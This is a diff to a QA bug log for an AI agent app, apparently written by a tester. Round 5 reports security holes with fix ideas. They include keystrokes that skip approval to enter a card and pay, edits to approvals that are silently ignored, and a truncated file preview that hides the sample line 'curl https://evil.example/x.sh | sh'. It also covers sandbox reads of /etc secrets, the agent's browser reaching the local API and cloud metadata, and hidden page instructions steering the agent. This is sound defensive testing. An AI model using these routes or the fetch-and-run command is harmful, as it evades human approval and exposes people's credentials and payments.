@@ -3,7 +3,187 @@
 Each bug has a test named "BUG n" that fails until it's fixed. The testing
 thread reports these, and the UI and back-end threads own the fixes.
 
-## Round 4 (2026-10-02): wave 2
+## Round 5 (2026-10-02): wave 4 and a security sweep over every wave
+
+I tested the back-end branch (`f14b773`) merged with the UI branch (`350cb2d`).
+The back end's own tests pass, 102 of 104. The two that fail need bubblewrap,
+which this machine doesn't have. All nine bugs from round 4 are fixed, and
+their tests pass. All 41 browser tests pass, including three updated for
+intended changes: take over follows the server, "Use this" confirms first, and
+tools read "3 tools, 3 to choose". Speech providers and shops were stand-ins,
+and the companion was the real program with its own settings file.
+
+These work:
+- Voice: with nothing set up, the app uses the browser's own speech (503
+  `voice_unavailable`). Server speech falls back to the next provider, and a
+  failing provider's key never shows.
+- The companion:
+  - pairing needs a fresh 8-character code that works once and runs out in 10
+    minutes, and five wrong codes use it up;
+  - a socket that hasn't paired gets nothing;
+  - both switches stop everything;
+  - every action asks, even for an autonomous Star with an "allow" rule;
+  - `..` and links can't leave the allowed folders.
+- Checkout: card numbers are refused in any field, even split with dashes.
+  The handover always asks, even with a "fine without asking" rule, and paying
+  then handing back finishes the task.
+- In the browser: the pairing panel shows the code and how long it lasts.
+
+### 28. Key presses never ask, so a Star can type a card number and press Pay (high, server)
+
+`browser_press` counts every key except plain `Enter` as a read
+(`effectFor` in `server/src/agent/tools/browser.ts`). Reads run without
+asking, even under "always ask", and in chat. `press()` has none of the card
+checks that `browser_type` has. So under "always ask", with no approval at all,
+a Star can do these:
+- press Tab to reach the card field;
+- type the card number one digit at a time;
+- press Tab to reach "Pay now", then Space, and the order is sent.
+
+`NumpadEnter` and `Control+Enter` submit forms too, and they count as reads.
+A page with hidden instructions could lead a Star through this.
+
+Fix idea: make `browser_press` a write, and make keys that can submit or
+activate (Enter in any form, Space, and anything with a modifier) a send. Refuse
+key presses while a payment field or a pay button has focus.
+
+Tests: `qa/server/round5.test.ts` "BUG 28" (the policy verdict, and the real
+checkout in Chromium).
+
+### 29. Edits to an approval are ignored, but the Star is told they were used (high, server and UI)
+
+The runner uses `editedPreview` only for tools that have `applyEdit`
+(`runner.ts`). Many tools don't have it:
+- `file_write`, `run_command` and `browser_click`;
+- MCP tools;
+- every `computer_*` tool.
+
+For these tools the original action runs, and the Star is told "The person
+edited it before approving; this is what was used". The UI offers Edit on
+`computer_write_file` approvals (`ApprovalCard.tsx`, the `Write`/`Add to`
+check). So a person can fix a file before it is written to their own computer,
+and the old version is written anyway.
+
+The test changes "account 111" to "account 222", then approves. The file still
+says 111.
+
+Fix idea: refuse an edit (400) for a tool without `applyEdit`, and hide Edit in
+the UI for those tools. Add `applyEdit` to the file writes.
+
+Test: "BUG 29".
+
+### 30. The approval for writing a file on the person's computer hides everything after 2,000 characters (medium, server and UI)
+
+The `computer_write_file` preview is `truncate(content, 2000)`, but the whole
+content is written. Say a file has 2,000 characters of harmless notes and then
+`curl https://evil.example/x.sh | sh`. The approval looks harmless. The
+companion's own prompt shows only the byte count. `file_write` cuts at 2,000
+too, but it only writes to the Star's own folder.
+
+Fix idea: show the whole content, scrollable, or the start and end with the
+size. Or refuse to ask about content too long to show.
+
+Test: "BUG 30".
+
+### 31. The command sandbox can read /etc, where the setup guide puts the password (high, server and docs)
+
+`bwrapArgs` in `server/src/workspace.ts` mounts all of `/etc` read-only. It
+hides only `shadow`, `gshadow`, `sudoers` and `/etc/ssh`. The setup guide in
+`server/README.md` puts `SKY_PASSWORD` (and anyone would put `SKY_SECRET_KEY`
+there too) in `/etc/systemd/system/sky.service`.
+
+A sandboxed command with no internet counts as a write. Under balanced autonomy,
+writes run without asking. So `cat /etc/systemd/system/sky.service` runs with no
+approval. The Star then has the sign-in password, and can send it out through
+`browser_open` (bug 32) without asking.
+
+This machine has no bubblewrap, so the test stubs the sandbox as present and
+checks the mounts.
+
+Fix idea:
+- Bind only what programs need from `/etc` (`ld.so*`, `ssl`, `alternatives`,
+  `resolv.conf`, `passwd`, `group`, `localtime`), or put a tmpfs over
+  `/etc/systemd`, `/etc/default` and `/etc/environment`.
+- Change the guide to use an `EnvironmentFile` that only root can read, outside
+  `/etc`.
+
+Test: "BUG 31".
+
+### 32. A Star's browser can open Sky's own API and other local addresses (medium, server)
+
+`browser_open` is a read, so it runs without asking, and in chat too. It opens
+`http://127.0.0.1:8787/api/v1/...`. With no password (the default on your own
+computer), that reads every Star's memory, files and recordings, and the
+settings. On a cloud machine it also reaches `169.254.169.254`, the cloud
+metadata service.
+
+Any address can carry data out in its path or query, also without asking. With
+bug 31 or a page's hidden instructions, that is a way to send things out.
+
+Fix idea: refuse Sky's own address and link-local or metadata addresses in the
+Star's browser. For tests, allow local pages only when a setting turns them on.
+
+Test: "BUG 32" (the Star reads a saved memory through the API).
+
+### 33. Teach-a-task recordings keep card numbers, and passwords typed in a frame (high, server)
+
+The recorder replaces typing with `[password]` only when the focused element
+in the main page is a password field.
+
+What the person types into a card field is kept as it is: "4222 2222 2222 2".
+A password typed in a sign-in frame is kept too, since the page's focused
+element is the `<iframe>`. Many banks sign in through a frame. Shadow DOM and a
+"show password" field (type text) have the same problem.
+
+Recordings are stored, shown in the app, and sent to the model to draft the
+skill. Teach doesn't call `vault.redact` either.
+
+Fix idea: in the frame where the typing happens, look through frames and
+shadow roots to the real focused element. Also treat `cc-*` autocomplete,
+fields `looksLikeCard` matches, and `one-time-code` as secret. Redact the
+vault's values before saving.
+
+Test: "BUG 33".
+
+### 34. An allowed program can reach files outside the allowed folders (medium, companion and docs)
+
+The companion checks the folder a program runs in, but not its arguments. With
+`cat` allowed, `computer_run cat /path/outside/private.txt` printed the file.
+`computer_read_file` refused the same file. `git -C ~`, `python3 -c ...` and
+`node -e ...` reach anything too. The companion README's own examples allow
+`git` and `python3`, and it only warns about shells.
+
+Every run still asks in Sky, and on the computer unless confirm is off. So this
+is about what the allowlist promises.
+
+Fix idea:
+- Refuse arguments that are absolute paths, start with `~`, or contain `..`,
+  unless they resolve inside an allowed folder.
+- In the README and in `allow-command`, warn that interpreters and `git` can
+  reach anything.
+
+Test: "BUG 34".
+
+### Lower-risk notes (no test)
+
+- Anyone who can reach the server can open the companion socket without
+  signing in and send five wrong codes. That uses up the person's live pairing
+  code, so they have to make a new one. Fix idea: ask for sign-in (or the
+  token) on the upgrade, or limit misses by address.
+- `Companion.result()` doesn't check that a reply comes from the computer that
+  got the call. Call ids are random, so this is hardening only.
+- When no computer is named, the one that runs is picked again at run time,
+  not the one shown on the approval. Fix idea: save the device id in the
+  approval.
+- Voice uploads of up to 25 MB are held in memory, with no limit on how many
+  run at once.
+- `pageUrl` and the live view allow `localhost` and private addresses for the
+  person. That's fine for the person, and it's part of why bug 32 works for
+  Stars.
+
+## Round 4 (2026-10-02): wave 2, all fixed
+
+Bugs 19 to 27 are now fixed, and their tests pass.
 
 I tested the back-end branch (`533666a`) merged with the UI branch (`59910ce`).
 The back end's own 87 tests pass, and the web app builds and type-checks. All
@@ -295,5 +475,11 @@ Also seen, small enough to leave without tests:
   In particular, how well a real model picks `ask_star`, `hand_off` and
   `message_star` isn't tested.
 - Real OAuth apps. Gmail was faked in-process.
+- bubblewrap itself. This machine doesn't have it, so commands ran without
+  the sandbox and asked every time. Bug 31 was found by reading the mounts.
+- The companion on Windows and macOS, opening pages on a real desktop, and
+  speech on a real phone microphone. Real Groq Whisper wasn't tested either.
+- A real card payment. The handover was tested up to the person paying on a
+  local page.
 - Approval expiry after 24 hours, and ask chains 3 deep through the UI. The
   server's own tests cover the depth limit.
